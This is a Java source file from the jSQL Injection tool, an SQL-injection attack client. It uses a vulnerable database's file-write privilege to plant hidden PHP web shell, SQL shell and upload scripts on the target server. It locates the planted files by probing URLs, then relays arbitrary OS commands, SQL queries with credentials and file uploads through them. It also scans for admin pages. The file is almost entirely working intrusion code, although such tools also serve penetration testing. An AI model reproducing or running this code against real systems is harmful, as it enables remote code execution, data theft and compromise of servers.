/*******************************************************************************
 * Copyhacked (H) 2012-2020.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.accessible;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLEncoder;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.EnumMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.bean.util.Header;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.LogLevel;
import com.jsql.util.StringUtil;

/**
 * Resource access object.
 * Get informations from file system, commands, webpage.
 */
public class ResourceAccess {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    /**
     * File name for web shell.
     */
    public final String filenameWebshell;
    
    /**
     * File name for sql shell.
     */
    public final String filenameSqlshell;
    
    /**
     * File name for upload form.
     */
    public final String filenameUpload;
    
    /**
     * True if admin page should stop, false otherwise.
     */
    private boolean isSearchAdminStopped = false;
    
    /**
     * True if scan list should stop, false otherwise.
     */
    private boolean isScanStopped = false;

    /**
     * True if ongoing file reading must stop, false otherwise.
     * If true any new file read is cancelled at start.
     */
    private boolean isSearchFileStopped = false;

    /**
     * True if current user has right to read file.
     */
    private boolean readingIsAllowed = false;

    /**
     * List of ongoing jobs.
     */
    private List<CallableFile> callablesReadFile = new ArrayList<>();
    
    private InjectionModel injectionModel;

    public ResourceAccess(InjectionModel injectionModel) {
        
        this.injectionModel = injectionModel;
        
        this.filenameWebshell = "." + this.injectionModel.getVersionJsql() + ".jw.php";
        this.filenameSqlshell = "." + this.injectionModel.getVersionJsql() + ".js.php";
        this.filenameUpload = "." + this.injectionModel.getVersionJsql() + ".ju.php";
    }

    public int callAdminPage(CompletionService<CallableHttpHead> taskCompletionService, int nbAdminPagesFound) {
        
        int nbAdminPagesFoundFixed = nbAdminPagesFound;
        
        try {
            CallableHttpHead currentCallable = taskCompletionService.take().get();
            
            if (currentCallable.isHttpResponseOk()) {
                
                var request = new Request();
                request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);
                request.setParameters(currentCallable.getUrl());
                this.injectionModel.sendToViews(request);

                nbAdminPagesFoundFixed++;
                LOGGER.log(LogLevel.CONSOLE_SUCCESS, "Found page: {}", currentCallable.getUrl());
            }
            
        } catch (InterruptedException e) {
            
            LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
            Thread.currentThread().interrupt();
            
        } catch (ExecutionException e) {
            
            LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
        }
        
        return nbAdminPagesFoundFixed;
    }

    public void logSearchAdminPage(int nbAdminPagesFound, int submittedTasks, int tasksHandled) {
        
        var result = String
            .format(
                "Found %s admin page%s%s on %s page%s",
                nbAdminPagesFound,
                nbAdminPagesFound > 1 ? 's' : StringUtils.EMPTY,
                tasksHandled != submittedTasks ? " of "+ tasksHandled +" processed" : StringUtils.EMPTY,
                submittedTasks,
                submittedTasks > 1 ? 's' : StringUtils.EMPTY
            );
        
        if (nbAdminPagesFound > 0) {
            
            LOGGER.log(LogLevel.CONSOLE_SUCCESS, result);
            
        } else {
            
            LOGGER.log(LogLevel.CONSOLE_ERROR, result);
        }
    }
    
    /**
     * Create a webshell in the server.
     * @param pathShell Remote path of the file
     * @throws InterruptedException
     * @throws InjectionFailureException
     * @throws StoppedByUserSlidingException
     */
    public void createWebShell(String pathShell, String urlShell) throws JSqlException, InterruptedException {
        
        if (!this.isReadingAllowed()) {
            
            return;
        }
        
        String sourceShellToInject =
            StringUtil
            .base64Decode(
                this.injectionModel.getMediatorUtils()
                .getPropertiesUtil()
                .getProperties()
                .getProperty("shell.web")
            )
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            
            pathShellFixed += "/";
        }
        
        this.injectionModel.injectWithoutIndex(
            this.injectionModel
            .getMediatorVendor()
            .getVendor()
            .instance()
            .sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameWebshell),
            "shell:create-web"
        );

        String resultInjection;
        var sourcePage = new String[]{ StringUtils.EMPTY };
        try {
            resultInjection = new SuspendableGetRows(this.injectionModel).run(
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameWebshell),
                sourcePage,
                false,
                1,
                null,
                "webshell"
            );

            if (StringUtils.isEmpty(resultInjection)) {
                
                throw new JSqlException("payload integrity verification: Empty payload");
            }
            
        } catch (JSqlException e) {
            
            throw new JSqlException("injected payload does not match source", e);
        }
        
        String urlShellFixed = urlShell;
        
        if (!urlShellFixed.isEmpty()) {
            
            urlShellFixed = urlShellFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
        }
        
        String url = urlShellFixed;
        if (StringUtils.isEmpty(url)) {
            
            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
        }

        if (resultInjection.indexOf(sourceShellToInject) <= -1) {
            
            throw this.getIntegrityError(sourcePage);
        }
            
        LOGGER.log(LogLevel.CONSOLE_SUCCESS, "Web payload created into '{}{}'", pathShellFixed, this.filenameWebshell);

        String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
        
        String urlProtocol;
        
        if ("/".equals(urlWithoutProtocol)) {
            
            urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
            
        } else {
            
            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
        }
        
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
        
        List<String> directoryNames = new ArrayList<>();
        if (urlWithoutFileName.split("/").length == 0) {
            
            directoryNames.add("/");
        }
        
        for (String directoryName: urlWithoutFileName.split("/")) {
            
            directoryNames.add(directoryName +"/");
        }
        
        this.injectWebshell(pathShellFixed, urlShellFixed, urlProtocol, urlWithoutFileName, directoryNames);
    }

    private void injectWebshell(String pathShellFixed, String urlShellFixed, String urlProtocol, String urlWithoutFileName, List<String> directoryNames) throws InterruptedException {
        
        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableCreateWebShell");
        
        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        
        var urlPart = new StringBuilder();
        
        for (String segment: directoryNames) {
            
            urlPart.append(segment);
            taskCompletionService.submit(
                new CallableHttpHead(
                    urlProtocol + urlPart.toString() + this.filenameWebshell,
                    this.injectionModel,
                    "wshell#run"
                )
            );
        }

        int submittedTasks = directoryNames.size() * 1;
        String urlSuccess = this.injectShell(urlShellFixed, urlProtocol, urlWithoutFileName, taskCompletionService, submittedTasks);

        taskExecutor.shutdown();
        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        
        if (urlSuccess != null) {
            
            var request = new Request();
            request.setMessage(Interaction.CREATE_SHELL_TAB);
            request.setParameters(pathShellFixed.replace(this.filenameWebshell, StringUtils.EMPTY), urlSuccess);
            this.injectionModel.sendToViews(request);
            
        } else {
            
            LOGGER.log(LogLevel.CONSOLE_ERROR, "HTTP connection to Web payload not found");
        }
    }

    private String injectShell(
        String urlShellFixed, String urlProtocol, String urlWithoutFileName,
        CompletionService<CallableHttpHead> taskCompletionService, int submittedTasks
    ) {
        
        String urlSuccess = null;
        
        for (var tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
            
            try {
                CallableHttpHead currentCallable = taskCompletionService.take().get();
                
                if (currentCallable.isHttpResponseOk()) {
                    
                    urlSuccess = currentCallable.getUrl();

                    if (
                        !urlShellFixed.isEmpty()
                        && urlSuccess.replace(this.filenameWebshell, StringUtils.EMPTY).equals(urlShellFixed)
                        || urlSuccess.replace(this.filenameWebshell, StringUtils.EMPTY).equals(urlProtocol + urlWithoutFileName)
                    ) {
                        
                        LOGGER.log(LogLevel.CONSOLE_SUCCESS, "Connection to payload found at expected location '{}'", urlSuccess);
                        
                    } else {
                        
                        LOGGER.log(LogLevel.CONSOLE_SUCCESS, "Connection to payload found at unexpected location '{}'", urlSuccess);
                    }
                    
                } else {
                    
                    LOGGER.log(LogLevel.CONSOLE_DEFAULT, "Connection to payload not found at '{}'", currentCallable.getUrl());
                }
                
            } catch (InterruptedException e) {
                
                LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
                Thread.currentThread().interrupt();
                
            } catch (ExecutionException e) {
                
                LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
            }
        }
        
        return urlSuccess;
    }
    
    /**
     * 
     * @param urlCommand
     * @return
     * @throws IOException
     */
    public String runCommandShell(String urlCommand) throws IOException {
        
        String pageSource = null;
        try {
            pageSource = this.injectionModel.getMediatorUtils().getConnectionUtil().getSource(urlCommand);
            
        } catch (Exception e) {
            
            pageSource = StringUtils.EMPTY;
        }
        
        var regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*)<"+ DataAccess.TRAIL +">").matcher(pageSource);
        regexSearch.find();

        String result;
        
        // IllegalStateException #1544: catch incorrect execution
        try {
            result = regexSearch.group(1);
            
        } catch (IllegalStateException e) {
            
            // Fix return null from regex
            result = StringUtils.EMPTY;
            LOGGER.log(LogLevel.CONSOLE_ERROR, "Incorrect response from Web shell", e);
        }
        
        return result;
    }
    
    /**
     * Run a shell command on host.
     * @param command The command to execute
     * @param uuidShell An unique identifier for terminal
     * @param urlShell Web path of the shell
     */
    public void runWebShell(String command, UUID uuidShell, String urlShell) {
        
        String result = StringUtils.EMPTY;
        
        try {
            result = this.runCommandShell(
                urlShell + "?c="+ URLEncoder.encode(command.trim(), "ISO-8859-1")
            );
            
            if (StringUtils.isBlank(result)) {
                result = "No result.\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
            }
            
        } catch (UnsupportedEncodingException e) {
            
            LOGGER.log(
                LogLevel.CONSOLE_ERROR,
                String.format("Encoding command to ISO-8859-1 failed: %s", e.getMessage()),
                e
            );
            
        } catch (IOException e) {
            
            LOGGER.log(
                LogLevel.CONSOLE_ERROR,
                String.format("Shell execution error: %s", e.getMessage()),
                e
            );
            
        } finally {
            
            // Unfroze interface
            var request = new Request();
            request.setMessage(Interaction.GET_WEB_SHELL_RESULT);
            request.setParameters(uuidShell, result);
            this.injectionModel.sendToViews(request);
        }
    }

    /**
     * Create SQL shell on the server. Override user name and password eventually.
     * @param pathShell Script to create on the server
     * @param urlShell URL for the script (used for url rewriting)
     * @param username User name for current database
     * @param password User password for current database
     * @throws InterruptedException
     * @throws InjectionFailureException
     * @throws StoppedByUserSlidingException
     */
    public void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException, InterruptedException {
        
        if (!this.isReadingAllowed()) {
            
            return;
        }
        
        String sourceShellToInject =
            StringUtil
            .base64Decode(
                this.injectionModel.getMediatorUtils()
                .getPropertiesUtil()
                .getProperties()
                .getProperty("shell.sql")
            )
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            
            pathShellFixed += "/";
        }
        
        this.injectionModel.injectWithoutIndex(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameSqlshell),
            "shell:create-sql"
        );

        String resultInjection;
        var sourcePage = new String[]{ StringUtils.EMPTY };
        
        try {
            resultInjection = new SuspendableGetRows(this.injectionModel).run(
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameSqlshell),
                sourcePage,
                false,
                1,
                null,
                "sqlshell"
            );

            if (StringUtils.isEmpty(resultInjection)) {
                
                throw new JSqlException("payload integrity verification: Empty payload");
            }
            
        } catch (JSqlException e) {
            
            throw new JSqlException("injected payload does not match source", e);
        }
        
        String urlShellFixed = urlShell;
        
        if (!urlShellFixed.isEmpty()) {
            
            urlShellFixed = urlShellFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
        }
        
        String url = urlShellFixed;
        if (StringUtils.isEmpty(url)) {
            
            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
        }

        if (resultInjection.indexOf(sourceShellToInject) <= -1) {
            
            throw this.getIntegrityError(sourcePage);
        }
            
        LOGGER.log(LogLevel.CONSOLE_SUCCESS, "SQL payload created into '{}{}'", pathShellFixed, this.filenameSqlshell);
        
        String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
        
        String urlProtocol;
        
        if ("/".equals(urlWithoutProtocol)) {
            
            urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
            
        } else {
            
            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
        }
        
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
        
        List<String> directoryNames = new ArrayList<>();
        
        if (urlWithoutFileName.split("/").length == 0) {
            
            directoryNames.add("/");
        }
        
        for (String directoryName: urlWithoutFileName.split("/")) {
            
            directoryNames.add(directoryName +"/");
        }
        
        this.injectShell(username, password, pathShellFixed, urlShellFixed, urlProtocol, urlWithoutFileName, directoryNames);
    }

    private void injectShell(
        String username, String password, String pathShellFixed, String urlShellFixed,
        String urlProtocol, String urlWithoutFileName, List<String> directoryNames
    ) throws InterruptedException {

        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableCreateSqlShell");
        
        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        
        var urlPart = new StringBuilder();
        
        for (String segment: directoryNames) {
            
            urlPart.append(segment);
            taskCompletionService.submit(
                new CallableHttpHead(
                    urlProtocol + urlPart.toString() + this.filenameSqlshell,
                    this.injectionModel,
                    "sqlshell:create"
                )
            );
        }

        int submittedTasks = directoryNames.size() * 1;
        int tasksHandled;
        String urlSuccess = null;
        
        for (tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
            
            try {
                CallableHttpHead currentCallable = taskCompletionService.take().get();
                
                if (!currentCallable.isHttpResponseOk()) {
                    
                    LOGGER.log(LogLevel.CONSOLE_DEFAULT, "Connection to payload not found at '{}'", currentCallable.getUrl());
                    continue;
                }
                    
                urlSuccess = currentCallable.getUrl();

                if (
                    !urlShellFixed.isEmpty()
                    && urlSuccess.replace(this.filenameSqlshell, StringUtils.EMPTY).equals(urlShellFixed)
                    || urlSuccess.replace(this.filenameSqlshell, StringUtils.EMPTY).equals(urlProtocol + urlWithoutFileName)
                ) {
                    
                    LOGGER.log(LogLevel.CONSOLE_SUCCESS, "Connection to payload found at expected location '{}'", urlSuccess);
                    
                } else {
                    
                    LOGGER.log(LogLevel.CONSOLE_SUCCESS, "Connection to payload found at unexpected location '{}'", urlSuccess);
                }
                
            } catch (InterruptedException e) {
                
                LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
                Thread.currentThread().interrupt();
                
            } catch (ExecutionException e) {
                
                LOGGER.log(LogLevel.CONSOLE_JAVA, e, e);
            }
        }

        taskExecutor.shutdown();
        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        
        if (urlSuccess != null) {
            
            var request = new Request();
            request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
            request.setParameters(
                pathShellFixed.replace(this.filenameSqlshell, StringUtils.EMPTY),
                urlSuccess,
                username,
                password
            );
            this.injectionModel.sendToViews(request);
            
        } else {
            
            LOGGER.log(LogLevel.CONSOLE_ERROR, "HTTP connection to SQL payload not found");
        }
    }

    /**
     * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
     * @param command SQL request to execute
     * @param uuidShell Identifier of terminal sending the request
     * @param urlShell URL to send SQL request against
     * @param username User name [optional]
     * @param password USEr password [optional]
     */
    public void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
        
        String result = StringUtils.EMPTY;
        
        try {
            result = this.runCommandShell(
                String
                .format(
                     "%s?q=%s&u=%s&p=%s",
                     urlShell,
                     URLEncoder.encode(command.trim(), "ISO-8859-1"),
                     username,
                     password
                )
            );
            
            if (result.indexOf("<SQLr>") > -1) {
                
                List<List<String>> listRows = this.parse(result);

                if (listRows.isEmpty()) {
                    return;
                }
                
                List<Integer> listFieldsLength = this.parseColumnLength(listRows);

                result = this.convert(listRows, listFieldsLength);
                
            } else if (result.indexOf("<SQLm>") > -1) {
                
                result = result.replace("<SQLm>", StringUtils.EMPTY) + "\n";
                
            } else if (result.indexOf("<SQLe>") > -1) {
                
                result = result.replace("<SQLe>", StringUtils.EMPTY) + "\n";
            }
            
        } catch (UnsupportedEncodingException e) {
            
            LOGGER.log(
                LogLevel.CONSOLE_ERROR,
                String.format("Encoding command to ISO-8859-1 failed: %s", e.getMessage()),
                e
            );
            
        } catch (IOException e) {
            
            LOGGER.log(
                LogLevel.CONSOLE_ERROR,
                String.format("Shell execution error: %s", e.getMessage()),
                e
            );
            
        } finally {
            
            // Unfroze interface
            var request = new Request();
            request.setMessage(Interaction.GET_SQL_SHELL_RESULT);
            request.setParameters(uuidShell, result, command);
            this.injectionModel.sendToViews(request);
        }
    }

    private String convert(List<List<String>> listRows, List<Integer> listFieldsLength) {
        
        var tableText = new StringBuilder("+");
        
        for (Integer fieldLength: listFieldsLength) {
            
            tableText.append("-"+ StringUtils.repeat("-", fieldLength) +"-+");
        }
        
        tableText.append("\n");

        for (List<String> listFields: listRows) {
            
            tableText.append("|");
            var cursorPosition = 0;
            
            for (String field: listFields) {
                
                tableText.append(
                    StringUtils.SPACE
                    + field
                    + StringUtils.repeat(StringUtils.SPACE, listFieldsLength.get(cursorPosition) - field.length())
                    + " |"
                );
                cursorPosition++;
            }
            
            tableText.append("\n");
        }

        tableText.append("+");
        
        for (Integer fieldLength: listFieldsLength) {
            
            tableText.append("-"+ StringUtils.repeat("-", fieldLength) +"-+");
        }
        
        tableText.append("\n");
        
        return tableText.toString();
    }

    private List<Integer> parseColumnLength(List<List<String>> listRows) {
        
        List<Integer> listFieldsLength = new ArrayList<>();
        
        for (
            var indexLongestRowSearch = 0;
            indexLongestRowSearch < listRows.get(0).size();
            indexLongestRowSearch++
        ) {
            
            int indexLongestRowSearchFinal = indexLongestRowSearch;
            
            Collections.sort(
                listRows,
                (firstRow, secondRow) -> secondRow.get(indexLongestRowSearchFinal).length() - firstRow.get(indexLongestRowSearchFinal).length()
            );

            listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch).length());
        }
        
        return listFieldsLength;
    }

    private List<List<String>> parse(String result) {
        
        List<List<String>> listRows = new ArrayList<>();
        var rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
        
        while (rowsMatcher.find()) {
            
            String values = rowsMatcher.group(1);

            var fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
            List<String> listFields = new ArrayList<>();
            listRows.add(listFields);
            
            while (fieldsMatcher.find()) {
                
                String field = fieldsMatcher.group(1);
                listFields.add(field);
            }
        }
        
        return listRows;
    }

    /**
     * Upload a file to the server.
     * @param pathFile Remote path of the file to upload
     * @param urlFile URL of uploaded file
     * @param file File to upload
     * @throws JSqlException
     * @throws IOException
     * @throws InterruptedException
     * @throws URISyntaxException
     */
    public void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException, InterruptedException {
        
        if (!this.isReadingAllowed()) {
            
            return;
        }
        
        String sourceShellToInject = StringUtil
            .base64Decode(
                this.injectionModel.getMediatorUtils()
                .getPropertiesUtil()
                .getProperties()
                .getProperty("shell.upload")
            )
            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD);
        
        String pathShellFixed = pathFile;
        
        if (!pathShellFixed.matches(".*/$")) {
            
            pathShellFixed += "/";
        }
        
        this.injectionModel.injectWithoutIndex(
            this.injectionModel
            .getMediatorVendor()
            .getVendor()
            .instance()
            .sqlTextIntoFile(
                "<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">",
                pathShellFixed + this.filenameUpload
            ),
            "upload"
        );

        var sourcePage = new String[]{ StringUtils.EMPTY };
        String sourceShellInjected;
        
        try {
            sourceShellInjected = new SuspendableGetRows(this.injectionModel).run(
                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameUpload),
                sourcePage,
                false,
                1,
                null,
                "upload"
            );
            
            if (StringUtils.isEmpty(sourceShellInjected)) {
                
                throw new JSqlException("Bad payload integrity: Empty payload");
            }
            
        } catch (JSqlException e) {
            
            throw this.getIntegrityError(sourcePage);
        }

        String urlFileFixed = urlFile;
        if (StringUtils.isEmpty(urlFileFixed)) {
            
            urlFileFixed = this.injectionModel
                .getMediatorUtils()
                .getConnectionUtil()
                .getUrlBase()
                .substring(
                    0,
                    this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().lastIndexOf('/') + 1
                );
        }
        
        if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
            
            String logUrlFileFixed = urlFileFixed;
            String logPathShellFixed = pathShellFixed;
            LOGGER.log(
                LogLevel.CONSOLE_SUCCESS,
                "Upload payload deployed at '{}{}' in '{}{}'",
                () -> logUrlFileFixed,
                () -> this.filenameUpload,
                () -> logPathShellFixed,
                () -> this.filenameUpload
            );
            
            try (InputStream streamToUpload = new FileInputStream(file)) {

                HttpResponse<String> result = this.upload(file, urlFileFixed +"/"+ this.filenameUpload, streamToUpload);
                
                this.confirmUpload(file, pathShellFixed, urlFileFixed, result);
            }
            
        } else {
            
            throw this.getIntegrityError(sourcePage);
        }
        
        var request = new Request();
        request.setMessage(Interaction.END_UPLOAD);
        this.injectionModel.sendToViews(request);
    }

    private HttpResponse<String> upload(File file, String string, InputStream streamToUpload) throws IOException, JSqlException, InterruptedException {
        
        var crLf = "\r\n";
        var boundary = "---------------------------4664151417711";
        
        var streamData = new byte[streamToUpload.available()];
        
        if (streamToUpload.read(streamData) == -1) {
            
            throw new JSqlException("Error reading the file");
        }
        
        String headerForm = StringUtils.EMPTY;
        headerForm += "--"+ boundary + crLf;
        headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\""+ file.getName() +"\""+ crLf;
        headerForm += "Content-Type: binary/octet-stream"+ crLf;
        headerForm += crLf;

        String headerFile = StringUtils.EMPTY;
        headerFile += crLf +"--"+ boundary +"--"+ crLf;

        var httpRequest = HttpRequest
            .newBuilder()
            .uri(URI.create(string))
            .timeout(Duration.ofSeconds(15))
            .POST(
                BodyPublishers.ofByteArrays(
                    Arrays.asList(
                        headerForm.getBytes(),
                        Files.readAllBytes(Paths.get(file.toURI())),
                        headerFile.getBytes()
                    )
                )
            )
            .setHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
            .build();
            
        return this.injectionModel.getMediatorUtils().getConnectionUtil().getHttpClient().send(httpRequest, BodyHandlers.ofString());
    }

    private void confirmUpload(File file, String pathShellFixed, String urlFileFixed, HttpResponse<String> httpResponse) {
   
        if (httpResponse.body().indexOf(DataAccess.LEAD +"y") > -1) {
            
            LOGGER.log(
                LogLevel.CONSOLE_SUCCESS,
                "File '{}' uploaded into '{}'",
                file::getName,
                () -> pathShellFixed
            );
            
        } else {
            
            LOGGER.log(
                LogLevel.CONSOLE_ERROR,
                "Upload file '{}' into '{}' failed",
                file::getName,
                () -> pathShellFixed
            );
        }
        
        Map<String, String> headers = ConnectionUtil.getHeadersMap(httpResponse);
            
        Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
        msgHeader.put(Header.URL, urlFileFixed);
        msgHeader.put(Header.POST, StringUtils.EMPTY);
        msgHeader.put(Header.HEADER, StringUtils.EMPTY);
        msgHeader.put(Header.RESPONSE, headers);
        msgHeader.put(Header.SOURCE, httpResponse.toString());
   
        var request = new Request();
        request.setMessage(Interaction.MESSAGE_HEADER);
        request.setParameters(msgHeader);
        this.injectionModel.sendToViews(request);
    }
    
    /**
     * Check if current user can read files.
     * @return True if user can read file, false otherwise
     * @throws JSqlException when an error occurs during injection
     */
    public boolean isReadingAllowed() throws JSqlException {
        
        // Unsupported Reading file when <file> is not present in current xmlModel
        // Fix #41055: NullPointerException on getFile()
        if (this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getResource().getFile() == null) {
            
            LOGGER.log(
                LogLevel.CONSOLE_ERROR,
                "Reading file on {} is currently not supported",
                () -> this.injectionModel.getMediatorVendor().getVendor()
            );
            return false;
        }
        
        var sourcePage = new String[]{ StringUtils.EMPTY };

        String resultInjection = new SuspendableGetRows(this.injectionModel).run(
            this.injectionModel.getMediatorVendor().getVendor().instance().sqlPrivilegeTest(),
            sourcePage,
            false,
            1,
            null,
            "privilege"
        );

        if (StringUtils.isEmpty(resultInjection)) {
            
            this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
            this.injectionModel.sendToViews(request);
            this.readingIsAllowed = false;
            
        } else if ("false".equals(resultInjection)) {
            
            LOGGER.log(LogLevel.CONSOLE_ERROR, "Privilege FILE is not granted to current user, files can\'t be read");
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
            this.injectionModel.sendToViews(request);
            this.readingIsAllowed = false;
            
        } else {
            
            var request = new Request();
            request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
            this.injectionModel.sendToViews(request);
            this.readingIsAllowed = true;
        }
        
        return this.readingIsAllowed;
    }
    
    /**
     * Mark the search of files to stop.
     * Any ongoing file reading is interrupted and any new file read
     * is cancelled.
     */
    public void stopSearchingFile() {
        
        this.setSearchFileStopped(true);
        
        // Force ongoing suspendable to stop immediately
        for (CallableFile callable: this.getCallablesReadFile()) {
            
            callable.getSuspendableReadFile().stop();
        }
    }
    
    private JSqlException getIntegrityError(String[] sourcePage) {
        
        return new JSqlException("Wrong payload integrity: "+ sourcePage[0].trim().replace("\\n", "\\\\\\n"));
    }
    
    
    // Getters and setters
    
    public boolean isSearchAdminStopped() {
        return this.isSearchAdminStopped;
    }

    public void setSearchAdminStopped(boolean isSearchAdminStopped) {
        this.isSearchAdminStopped = isSearchAdminStopped;
    }
    
    public void setScanStopped(boolean isScanStopped) {
        this.isScanStopped = isScanStopped;
    }

    public boolean isReadingIsAllowed() {
        return this.readingIsAllowed;
    }

    public void setReadingIsAllowed(boolean readingIsAllowed) {
        this.readingIsAllowed = readingIsAllowed;
    }

    public boolean isScanStopped() {
        return this.isScanStopped;
    }

    public boolean isSearchFileStopped() {
        return this.isSearchFileStopped;
    }

    public void setSearchFileStopped(boolean isSearchFileStopped) {
        this.isSearchFileStopped = isSearchFileStopped;
    }

    public List<CallableFile> getCallablesReadFile() {
        return this.callablesReadFile;
    }

    public void setCallablesReadFile(List<CallableFile> callablesReadFile) {
        this.callablesReadFile = callablesReadFile;
    }
}
